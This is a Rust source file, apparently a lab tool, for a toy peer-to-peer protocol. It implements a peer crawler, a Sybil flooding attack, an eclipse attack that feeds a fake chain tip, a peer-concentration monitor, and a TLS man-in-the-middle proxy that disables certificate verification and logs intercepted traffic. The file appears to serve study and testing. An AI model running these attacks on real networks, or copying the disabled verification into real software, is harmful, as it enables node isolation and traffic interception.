use p2p_core::{Message, NodeId};
use std::collections::{HashSet, VecDeque};
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpListener;
use tokio::net::TcpStream;
use tokio_rustls::rustls;
use tokio_rustls::rustls::ClientConfig;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::{TlsAcceptor, TlsConnector};

#[tokio::main]
async fn main() {
    rustls::crypto::ring::default_provider()
        .install_default()
        .ok();
    let args: Vec<String> = std::env::args().collect();
    match args[1].as_str() {
        "crawl" => {
            let seed: SocketAddr = args[2].parse().unwrap();
            crawl(seed).await;
        }
        "sybil" => {
            let target: SocketAddr = args[2].parse().unwrap();
            let count: usize = args[3].parse().unwrap();
            sybil_attack(target, count).await;
        }
        "monitor" => {
            let target: SocketAddr = args[2].parse().unwrap();
            monitor(target).await;
        }
        "eclipse" => {
            let target: SocketAddr = args[2].parse().unwrap();
            eclipse(target).await;
        }
        "mitm" => {
            let listen_port: u16 = args[2].parse().unwrap();
            let real_target: SocketAddr = args[3].parse().unwrap();
            mitm(listen_port, real_target).await;
        }
        _ => eprintln!("Usage: p2p-lab <crawl|sybil>|monitor|eclipse|mitm <addr> [count]"),
    }
}

async fn crawl(seed: SocketAddr) {
    let mut visited: HashSet<SocketAddr> = HashSet::new();
    let mut queue: VecDeque<SocketAddr> = VecDeque::new();

    queue.push_back(seed);

    while let Some(addr) = queue.pop_front() {
        if visited.contains(&addr) {
            continue;
        }
        visited.insert(addr);

        println!("visiting {addr}");

        match query_peers(addr).await {
            Some(peers) => {
                println!(" {} -> {:?}", addr, peers);
                for peer in peers {
                    if peer.port() == 0 {
                        continue;
                    }
                    if !visited.contains(&peer) {
                        queue.push_back(peer);
                    }
                }
            }
            None => println!(" {} -> unreachable", addr),
        }
    }
    println!("Done. Discovered {} nodes.", visited.len());
}

async fn query_peers(addr: SocketAddr) -> Option<Vec<SocketAddr>> {
    let mut stream = TcpStream::connect(addr).await.ok()?;

    // send Hello
    let node_id = NodeId::random();
    // note: crawler has no listen port
    let msg = Message::Hello {
        node_id,
        listen_addr: "127.0.0.1:0".parse().unwrap(),
        peers: vec![],
    };
    let mut line = serde_json::to_string(&msg).unwrap();
    line.push('\n');
    stream.write_all(line.as_bytes()).await.ok()?;

    let (read_half, mut write_half) = stream.into_split();
    let mut reader = BufReader::new(read_half);
    let mut line = String::new();

    // read Hello reply
    reader.read_line(&mut line).await.ok()?;
    line.clear();

    // send GetPeers
    let mut get = serde_json::to_string(&Message::GetPeers).unwrap();
    get.push('\n');
    write_half.write_all(get.as_bytes()).await.ok()?;

    // read Peers response
    reader.read_line(&mut line).await.ok()?;
    match serde_json::from_str(line.trim()).ok()? {
        Message::Peers(list) => Some(list),
        _ => None,
    }
}

async fn sybil_attack(target: SocketAddr, count: usize) {
    println!("Launching {count} Sybil nodes against {target}...");

    let mut handles = vec![];

    for i in 0..count {
        handles.push(tokio::spawn(async move {
            let node_id = NodeId::random();
            match TcpStream::connect(target).await {
                Ok(mut stream) => {
                    let msg = Message::Hello {
                        node_id,
                        listen_addr: format!("127.0.0.1:{}", 19000 + i).parse().unwrap(),
                        peers: vec![],
                    };
                    let mut line = serde_json::to_string(&msg).unwrap();
                    line.push('\n');
                    if stream.write_all(line.as_bytes()).await.is_err() {
                        return;
                    }

                    println!(" sybil-{i} connected ({node_id:?})");

                    // hold connection open forever
                    tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
                }
                Err(e) => eprintln!(" sybil-{i} failed: {e}"),
            }
        }));
    }

    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;

    // crawl victim to measure peer occupation
    let peers = query_peers(target).await.unwrap_or_default();
    let sybil_count = peers
        .iter()
        .filter(|a| a.port() >= 19000) // sybil ports start at 19000
        .count();

    println!("\n=== Sybil Attack Result ===");
    println!("Victim peer list: {:?}", peers);
    println!("Total peers: {}", peers.len());
    println!("Sybil peers: {}", sybil_count);
    println!(
        "Occupancy:  {:.0}%",
        sybil_count as f64 / peers.len().max(1) as f64 * 100.0
    );

    tokio::signal::ctrl_c().await.unwrap();
    for h in handles {
        h.abort()
    }
}

async fn monitor(target: SocketAddr) {
    println!("Monitoring {target}...");

    loop {
        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;

        let peers = match query_peers(target).await {
            Some(p) => p,
            None => {
                println!("[WARN] target unreachable");
                continue;
            }
        };

        if peers.is_empty() {
            println!("peer list empty");
            continue;
        }

        // count how many peers share the same IP
        let mut ip_count: std::collections::HashMap<std::net::IpAddr, usize> =
            std::collections::HashMap::new();

        for peer in &peers {
            *ip_count.entry(peer.ip()).or_default() += 1;
        }

        // find the dominant IP
        let (dominant_ip, dominant_count) = ip_count.iter().max_by_key(|(_, c)| *c).unwrap();

        let concentration = *dominant_count as f64 / peers.len() as f64 * 100.0;

        println!(
            "[monitor] peers={} dominant_ip={} ({}/{} = {:.0}%)",
            peers.len(),
            dominant_ip,
            dominant_count,
            peers.len(),
            concentration
        );

        if concentration >= 50.0 {
            println!(
                "[WARN] Peer table concentration: {:.0}% from {}",
                concentration, dominant_ip
            );
        }
        if concentration >= 100.0 {
            println!("[ALERT] Possible Eclipse setup - all peers from same IP!");
        }
    }
}

async fn eclipse(target: SocketAddr) {
    println!("=== Eclipse Attack Scenario ===");
    println!("Target: {target}");

    // step 1: check honest tip before attack
    println!("\n[Before attack]");
    let before = query_peers(target).await.unwrap_or_default();
    println!("Victim peers: {:?}", before);

    // step 2: launch sybil nodes that send fake tip
    println!("\n[Launching Sybil nodes...]");
    let mut handles = vec![];
    for i in 0..20usize {
        handles.push(tokio::spawn(async move {
            let node_id = NodeId::random();
            let Ok(mut stream) = TcpStream::connect(target).await else {
                return;
            };

            let msg = Message::Hello {
                node_id,
                listen_addr: format!("127.0.0.1:{}", 19000 + i).parse().unwrap(),
                peers: vec![],
            };
            let mut line = serde_json::to_string(&msg).unwrap();
            line.push('\n');
            if stream.write_all(line.as_bytes()).await.is_err() {
                return;
            }

            // read Hello reply
            let (read_half, mut write_half) = stream.into_split();
            let mut reader = BufReader::new(read_half);
            let mut buf = String::new();
            reader.read_line(&mut buf).await.ok();

            // send fake tip
            let fake_tip = Message::Tip {
                height: 9999,
                hash: "attacker_tip_FAKE".to_string(),
            };
            let mut tip_line = serde_json::to_string(&fake_tip).unwrap();
            tip_line.push('\n');
            write_half.write_all(tip_line.as_bytes()).await.ok();

            // hold connection
            tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
        }));
    }

    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;

    // step 3: measure result
    println!("\n[After attack]");
    let peers = query_peers(target).await.unwrap_or_default();
    let sybil = peers.iter().filter(|a| a.port() >= 19000).count();
    let _concentration = sybil as f64 / peers.len().max(1) as f64 * 100.0;

    println!("Victim peers:    {:?}", peers);
    println!("Honest peers remaining: {}", peers.len() - sybil);
    println!("Sybil peers:            {}", sybil);
    println!("Victim received fake tip: height=9999 hash=attacker_tip_FAKE");
    println!("Honest tip:               height=100  hash=honest");
    println!("State diverged:           {}", sybil == peers.len());

    tokio::signal::ctrl_c().await.unwrap();
    for h in handles {
        h.abort();
    }
}

async fn mitm(listen_port: u16, real_target: SocketAddr) {
    println!("=== TLS MITM ===");
    println!("Listening on: 127.0.0.1:{listen_port}");
    println!("Proxying to : {real_target}");

    let (server_config, _, _) = p2p_node::make_tls_config();
    let acceptor = TlsAcceptor::from(Arc::new(server_config));

    let listener = TcpListener::bind(format!("127.0.0.1:{listen_port}"))
        .await
        .unwrap();

    loop {
        if let Ok((tcp_stream, victim_addr)) = listener.accept().await {
            println!("[mitm] victim connected from {victim_addr}");
            let acceptor = acceptor.clone();
            tokio::spawn(async move {
                // complete TLS with victim
                let Ok(victim_tls) = acceptor.accept(tcp_stream).await else {
                    eprintln!("[mitm] TLS accept failed");
                    return;
                };
                println!("[mitm] TLS established with victim");
                // connect to real target with TLS
                let client_config = ClientConfig::builder()
                    .dangerous()
                    .with_custom_certificate_verifier(Arc::new(p2p_node::NoVerifier))
                    .with_no_client_auth();
                let connector = TlsConnector::from(Arc::new(client_config));
                let tcp_to_target = tokio::net::TcpStream::connect(real_target).await.unwrap();
                let server_name = ServerName::try_from("localhost").unwrap();
                let Ok(target_tls) = connector.connect(server_name, tcp_to_target).await else {
                    eprintln!("[mitm] TLS connect to target failed");
                    return;
                };
                println!("[mitm] TLS established with target");

                // bidirectional proxy with logging
                let (victim_read, victim_write) = tokio::io::split(victim_tls);
                let victim_read = BufReader::new(victim_read);
                let (target_read, target_write) = tokio::io::split(target_tls);
                let target_read = BufReader::new(target_read);
                let v2t = proxy_direction("victim->target", victim_read, target_write);
                let t2v = proxy_direction("target->victim", target_read, victim_write);

                tokio::join!(v2t, t2v);
            });
        }
    }
}

async fn proxy_direction<R, W>(label: &'static str, mut reader: R, mut writer: W)
where
    R: tokio::io::AsyncBufRead + Unpin,
    W: tokio::io::AsyncWrite + Unpin,
{
    let mut line = String::new();
    loop {
        line.clear();
        if reader.read_line(&mut line).await.unwrap_or(0) == 0 {
            break;
        }
        println!("[mitm][{label}] {}", line.trim());
        if writer.write_all(line.as_bytes()).await.is_err() {
            break;
        }
    }
}
